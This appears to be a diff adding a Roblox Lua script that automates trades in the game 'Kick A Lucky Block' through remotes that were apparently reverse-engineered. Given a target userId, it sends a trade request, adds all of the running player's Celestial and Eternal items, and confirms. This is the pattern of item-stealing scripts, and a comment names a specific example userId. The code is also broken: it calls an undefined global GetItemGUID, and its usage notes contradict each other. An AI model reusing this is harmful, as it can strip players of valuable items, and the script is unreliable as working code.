@@ -1,0 +1,476 @@
+--[[
+    Kick A Lucky Block - Trade Automation System
+    
+    GAME MECHANICS (DISCOVERED):
+    - Trade sending: Network:InvokeServer("trade_r", userId)
+    - Trade accepting: Network:FireServer("trade_start", userId)
+    - Add item to trade: FireServer("AddItem", itemGUID) via rev_trade_i remote
+    - Remove item from trade: FireServer("RemoveItem", itemGUID) via rev_trade_i remote
+    - Confirm trade: FireServer("Confirm") via rev_trade_i remote
+    - Inventory items: Tools in Backpack/Character with GUID attributes
+    - Mutations: Tagged on tools using CollectionService
+    - Rarities: Defined in EntitiesData for each Brainrot
+    
+    REMOTE LOCATION:
+    ReplicatedStorage > Shared > Packages > Network > rev_trade_i
+    
+    USAGE:
+    - Place this script as a LocalScript in StarterPlayer > StarterPlayerScripts
+    - Requires access to ReplicatedStorage.Shared.Packages.Network
+]]--
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CollectionService = game:GetService("CollectionService")
+
+local LocalPlayer = Players.LocalPlayer
+local Backpack = LocalPlayer.Backpack
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+
+-- Load game modules
+local Network = require(ReplicatedStorage.Shared.Packages.Network)
+local EntitiesData = require(ReplicatedStorage.Shared.Data.EntitiesData)
+local MutationData = require(ReplicatedStorage.Shared.Data.MutationData)
+
+-- ============================================================================
+-- CONFIGURATION
+-- ============================================================================
+
+local CONFIG = {
+    -- Allowed rarities for trading
+    AllowedRarities = {
+        ["Celestial"] = true,
+        ["Eternal"] = true,
+    },
+    
+    -- Time to wait between adding items (prevents spam)
+    AddItemDelay = 0.1,
+    
+    -- Time to wait before confirming trade
+    ConfirmDelay = 0.5,
+    
+    -- Enable debug output
+    DebugMode = true,
+}
+
+-- ============================================================================
+-- UTILITY FUNCTIONS
+-- ============================================================================
+
+local function Log(message, level)
+    level = level or "INFO"
+    if CONFIG.DebugMode then
+        print(string.format("[TradeAutomation | %s] %s", level, message))
+    end
+end
+
+local function GetRarityValue(rarityName)
+    -- Priority order: Celestial > Eternal
+    local rarityMap = {
+        Eternal = 2,
+        Celestial = 3,
+    }
+    return rarityMap[rarityName] or 0
+end
+
+local function GetBrainrotRarity(toolName)
+    -- Get rarity from EntitiesData
+    if EntitiesData and EntitiesData.Brainrots then
+        local brainrotData = EntitiesData.Brainrots[toolName]
+        if brainrotData then
+            return brainrotData.Rarity
+        end
+    end
+    return nil
+end
+
+local function GetItemMutations(tool)
+    -- Get mutations from CollectionService tags
+    local mutations = {}
+    local tags = CollectionService:GetTags(tool)
+    
+    for _, tag in ipairs(tags) do
+        if MutationData.ValidMutations and table.find(MutationData.ValidMutations, tag) then
+            table.insert(mutations, tag)
+        end
+    end
+    
+    return mutations
+end
+
+-- ============================================================================
+-- INVENTORY SCANNING
+-- ============================================================================
+
+-- ============================================================================
+-- TRADE REMOTE ACCESS
+-- ============================================================================
+
+local TradeRemote = nil
+
+local function GetTradeRemote()
+    if TradeRemote then return TradeRemote end
+    
+    TradeRemote = ReplicatedStorage
+        :WaitForChild("Shared")
+        :WaitForChild("Packages")
+        :WaitForChild("Network")
+        :WaitForChild("rev_trade_i")
+    
+    return TradeRemote
+end
+
+-- ============================================================================
+-- INVENTORY SCANNING
+-- ============================================================================
+
+local InventoryScanner = {}
+
+function InventoryScanner.GetItemGUID(tool)
+    -- Get GUID from tool attributes
+    -- Try common attribute names used by Roblox games
+    local guid = tool:GetAttribute("GUID") or tool:GetAttribute("Id") or tool:GetAttribute("ItemId")
+    
+    if not guid then
+        -- If no GUID attribute, use tool's Instance ID as fallback
+        guid = tool:GetAttribute("UniqueId") or tostring(tool.Name)
+    end
+    
+    return guid
+end
+
+function InventoryScanner.GetAllBrainrots()
+    local allItems = {}
+    
+    -- Scan Backpack
+    for _, tool in ipairs(Backpack:GetChildren()) do
+        if tool:IsA("Tool") then
+            table.insert(allItems, tool)
+        end
+    end
+    
+    -- Scan Character
+    if Character then
+        for _, tool in ipairs(Character:GetChildren()) do
+            if tool:IsA("Tool") then
+                table.insert(allItems, tool)
+            end
+        end
+    end
+    
+    return allItems
+end
+
+function InventoryScanner.GetMatchingBrainrots()
+    local matches = {}
+    local items = InventoryScanner.GetAllBrainrots()
+    
+    for _, tool in ipairs(items) do
+        local rarity = GetBrainrotRarity(tool.Name)
+        
+        if rarity and CONFIG.AllowedRarities[rarity] then
+            local mutations = GetItemMutations(tool)
+            
+            table.insert(matches, {
+                Name = tool.Name,
+                Rarity = rarity,
+                Mutations = mutations,
+                Level = tool:GetAttribute("Level") or 1,
+                Instance = tool,
+            })
+        end
+    end
+    
+    -- Sort by rarity (descending priority)
+    table.sort(matches, function(a, b)
+        return GetRarityValue(a.Rarity) > GetRarityValue(b.Rarity)
+    end)
+    
+    return matches
+end
+
+function InventoryScanner.PrintInventory()
+    local matches = InventoryScanner.GetMatchingBrainrots()
+    Log(string.format("Found %d matching items:", #matches), "INVENTORY")
+    
+    for i, item in ipairs(matches) do
+        local mutationStr = #item.Mutations > 0 and table.concat(item.Mutations, ", ") or "None"
+        Log(string.format(
+            "  [%d] %s | Rarity: %s | Level: %d | Mutations: %s",
+            i,
+            item.Name,
+            item.Rarity,
+            item.Level,
+            mutationStr
+        ), "INVENTORY")
+    end
+    
+    return matches
+end
+
+-- ============================================================================
+-- TRADE MANAGEMENT
+-- ============================================================================
+
+local TradeManager = {}
+TradeManager.isTradeActive = false
+TradeManager.tradePartnerUserId = nil
+TradeManager.itemsInTrade = {} -- Track which GUIDs we've added
+
+function TradeManager.SendTradeRequest(userId)
+    Log(string.format("Sending trade request to player %d", userId), "TRADE")
+    
+    -- Use actual game network: Network:InvokeServer("trade_r", userId)
+    local success, message = Network:InvokeServer("trade_r", userId)
+    
+    if success then
+        Log(string.format("Trade request sent successfully to %d", userId), "TRADE")
+        TradeManager.isTradeActive = true
+        TradeManager.tradePartnerUserId = userId
+        TradeManager.itemsInTrade = {}
+    else
+        Log(string.format("Trade request failed: %s", message or "unknown error"), "ERROR")
+    end
+    
+    return success
+end
+
+function TradeManager.AcceptTrade(userId)
+    Log(string.format("Accepting trade from player %d", userId), "TRADE")
+    
+    -- Use actual game network: Network:FireServer("trade_start", userId)
+    Network:FireServer("trade_start", userId)
+    
+    TradeManager.isTradeActive = true
+    TradeManager.tradePartnerUserId = userId
+    TradeManager.itemsInTrade = {}
+end
+
+function TradeManager.AddItemToTrade(tool)
+    if not TradeManager.isTradeActive then
+        Log("Cannot add item: no active trade", "WARN")
+        return false
+    end
+    
+    if not tool or not tool:IsA("Tool") then
+        Log("Invalid tool provided", "ERROR")
+        return false
+    end
+    
+    local guid = GetItemGUID(tool)
+    Log(string.format("Adding item to trade: %s (GUID: %s)", tool.Name, guid), "TRADE")
+    
+    -- FireServer("AddItem", itemGUID) on rev_trade_i remote
+    local tradeRemote = GetTradeRemote()
+    local args = {"AddItem", guid}
+    
+    local success, err = pcall(function()
+        tradeRemote:FireServer(unpack(args))
+    end)
+    
+    if not success then
+        Log(string.format("Failed to add item: %s", err), "ERROR")
+        return false
+    end
+    
+    TradeManager.itemsInTrade[guid] = true
+    return true
+end
+
+function TradeManager.RemoveItemFromTrade(tool)
+    if not TradeManager.isTradeActive then
+        Log("Cannot remove item: no active trade", "WARN")
+        return false
+    end
+    
+    local guid = GetItemGUID(tool)
+    Log(string.format("Removing item from trade: %s (GUID: %s)", tool.Name, guid), "TRADE")
+    
+    -- FireServer("RemoveItem", itemGUID) on rev_trade_i remote
+    local tradeRemote = GetTradeRemote()
+    local args = {"RemoveItem", guid}
+    
+    local success, err = pcall(function()
+        tradeRemote:FireServer(unpack(args))
+    end)
+    
+    if not success then
+        Log(string.format("Failed to remove item: %s", err), "ERROR")
+        return false
+    end
+    
+    TradeManager.itemsInTrade[guid] = nil
+    return true
+end
+
+function TradeManager.ConfirmTrade()
+    if not TradeManager.isTradeActive then
+        Log("Cannot confirm: no active trade", "WARN")
+        return false
+    end
+    
+    Log("Confirming trade (both players must confirm)", "TRADE")
+    
+    -- FireServer("Confirm") on rev_trade_i remote
+    local tradeRemote = GetTradeRemote()
+    local args = {"Confirm"}
+    
+    local success, err = pcall(function()
+        tradeRemote:FireServer(unpack(args))
+    end)
+    
+    if not success then
+        Log(string.format("Failed to confirm trade: %s", err), "ERROR")
+        return false
+    end
+    
+    return true
+end
+
+function TradeManager.EndTrade()
+    Log("Ending trade session", "TRADE")
+    TradeManager.isTradeActive = false
+    TradeManager.tradePartnerUserId = nil
+    TradeManager.itemsInTrade = {}
+end
+
+-- ============================================================================
+-- AUTOMATION WORKFLOW
+-- ============================================================================
+
+local AutoTradeWorkflow = {}
+
+function AutoTradeWorkflow.ExecuteFullTrade(userId)
+    Log(string.format("=== STARTING FULL TRADE WORKFLOW FOR PLAYER %d ===", userId), "WORKFLOW")
+    
+    -- Step 1: Send the trade request
+    local requestSuccess = TradeManager.SendTradeRequest(userId)
+    if not requestSuccess then
+        Log("Failed to send trade request", "ERROR")
+        TradeManager.EndTrade()
+        return false
+    end
+    
+    wait(1) -- Give server time to set up trade
+    
+    -- Step 2: Scan inventory and get matching items
+    local matchingItems = InventoryScanner.GetMatchingBrainrots()
+    
+    if #matchingItems == 0 then
+        Log("No matching items found in inventory", "WARN")
+        TradeManager.EndTrade()
+        return false
+    end
+    
+    Log(string.format("Found %d items to trade", #matchingItems), "WORKFLOW")
+    
+    -- Step 3: Add all matching items to trade
+    for _, item in ipairs(matchingItems) do
+        TradeManager.AddItemToTrade(item.Instance)
+        wait(CONFIG.AddItemDelay)
+    end
+    
+    -- Step 4: Wait a moment for UI to update
+    wait(CONFIG.ConfirmDelay)
+    
+    -- Step 5: Confirm the trade
+    TradeManager.ConfirmTrade()
+    
+    Log("=== TRADE WORKFLOW COMPLETE ===", "WORKFLOW")
+    
+    -- Note: Trade won't complete until the other player also confirms
+    -- TODO: Listen for trade completion event if available
+    
+    return true
+end
+
+-- ============================================================================
+-- DETECTION AND EVENT HANDLING
+-- ============================================================================
+
+--[[
+    UNKNOWN: How does the game notify us of incoming trade requests?
+    
+    POSSIBLE APPROACHES:
+    1. Listen to RemoteEvents in ReplicatedStorage that fire when a trade starts
+    2. Monitor UI changes (check for trade window appearance)
+    3. Use game.Players.LocalPlayer specific events
+    4. Periodically check for trade session data
+    
+    For now, we'll listen for potential trade-related remotes and provide manual trigger
+]]--
+
+local function SetupTradeDetection()
+    Log("Setting up trade detection", "INIT")
+    
+    -- Attempt to find trade-related remotes
+    -- This is exploratory - adjust based on what you find
+    local Network = ReplicatedStorage:WaitForChild("Shared")
+        :WaitForChild("Packages")
+        :WaitForChild("Network")
+    
+    -- Try to detect when a trade starts
+    local function OnChildAdded(child)
+        if child:IsA("RemoteFunction") or child:IsA("RemoteEvent") then
+            if string.find(child.Name:lower(), "trade") then
+                Log(string.format("Detected trade remote: %s", child.Name), "DEBUG")
+            end
+        end
+    end
+    
+    Network.ChildAdded:Connect(OnChildAdded)
+    
+    -- TODO: Add event listeners based on discovered trade events
+end
+
+-- ============================================================================
+-- MANUAL TRADE TRIGGER (for testing)
+-- ============================================================================
+
+-- You can call this function from command bar to test:
+-- require(game.ServerScriptService.TradeAutomation).ExecuteTrade(10605759721)
+
+local PublicAPI = {}
+
+function PublicAPI.ExecuteTrade(userId)
+    if not userId or userId == 0 then
+        Log("Invalid userId", "ERROR")
+        return false
+    end
+    
+    return AutoTradeWorkflow.ExecuteFullTrade(userId)
+end
+
+function PublicAPI.ShowInventory()
+    return InventoryScanner.PrintInventory()
+end
+
+function PublicAPI.ManualAddItem(toolNameOrGUID)
+    -- Can accept either tool name or GUID
+    local items = InventoryScanner.GetAllBrainrots()
+    
+    for _, tool in ipairs(items) do
+        local guid = GetItemGUID(tool)
+        -- Try matching by name or GUID
+        if tool.Name == toolNameOrGUID or guid == toolNameOrGUID then
+            return TradeManager.AddItemToTrade(tool)
+        end
+    end
+    
+    Log(string.format("Item not found: %s", toolNameOrGUID), "ERROR")
+    return false
+end
+
+function PublicAPI.ManualConfirm()
+    return TradeManager.ConfirmTrade()
+end
+
+-- ============================================================================
+-- INITIALIZATION
+-- ============================================================================
+
+SetupTradeDetection()
+Log("Trade Automation System initialized", "INIT")
+
+-- Export public API
+return PublicAPI
